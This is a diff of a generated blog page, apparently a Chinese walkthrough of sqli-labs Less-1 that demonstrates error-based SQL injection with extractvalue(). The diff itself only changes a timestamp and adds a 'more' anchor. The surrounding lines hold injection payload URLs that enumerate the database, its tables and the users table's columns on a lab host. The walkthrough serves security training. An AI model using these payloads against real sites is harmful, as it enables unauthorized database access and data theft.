@@ -93,7 +93,7 @@
 <meta property="og:image" content="http://ww2.sinaimg.cn/large/006tNc79ly1g46wggbw6zj31pq0g00ve.jpg">
 <meta property="og:image" content="http://ww4.sinaimg.cn/large/006tNc79ly1g46wgnbtvrj31es0fkdi3.jpg">
 <meta property="og:image" content="http://ww1.sinaimg.cn/large/006tNc79ly1g46wh7ozhdj31kw0fomzq.jpg">
-<meta property="og:updated_time" content="2019-06-20T14:29:24.761Z">
+<meta property="og:updated_time" content="2019-06-20T14:41:57.263Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="sqli-labs_less_1">
 <meta name="twitter:description" content="方法一：报错注入extractvalue()判断注入点：输入单引号，发现页面报错 http://172.16.173.131/sqli-labs/Less-1/?id=1&amp;#39; 闭合前一个单引号，注释掉后一个，并加入判断payloadhttp://172.16.173.131/sqli-labs/Less-1/?id=1&amp;#39; and 1=1--+ 所以利用extractvalue()报错">
@@ -353,6 +353,8 @@
 http://172.16.173.131/sqli-labs/Less-1/?id=1&#39;</code><br><img src="http://ww1.sinaimg.cn/large/006tNc79ly1g46wcsf4ndj31vg06uq4n.jpg" alt></p>
 <p>闭合前一个单引号，注释掉后一个，并加入判断payload<br><code>http://172.16.173.131/sqli-labs/Less-1/?id=1&#39; and 1=1--+</code></p>
 <p>所以利用extractvalue()报错注入<br>先判断函数是否可执行<br><code>http://172.16.173.131/sqli-labs/Less-1/?id=1&#39; and extractvalue(1,md5(123));--+</code><br><img src="http://ww4.sinaimg.cn/large/006tNc79ly1g46wdeuw7nj31jy0eigod.jpg" alt></p>
+<a id="more"></a>
+
 <p>获取version()、database()、user()等信息<br><code>http://172.16.173.131/sqli-labs/Less-1/?id=1&#39; and extractvalue(1,concat(0x7e,database()));--+</code><br><img src="http://ww1.sinaimg.cn/large/006tNc79ly1g46wdvrs8sj313y0egjt9.jpg" alt></p>
 <p>获取表名：<br><code>http://172.16.173.131/sqli-labs/Less-1/?id=1&#39; and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 0,1)));--+</code><br><img src="http://ww2.sinaimg.cn/large/006tNc79ly1g46wggbw6zj31pq0g00ve.jpg" alt></p>
 <p>获取users的列名<br><code>http://172.16.173.131/sqli-labs/Less-1/?id=1&#39; and extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39; limit 0,1)));--+</code><br><img src="http://ww4.sinaimg.cn/large/006tNc79ly1g46wgnbtvrj31es0fkdi3.jpg" alt></p>
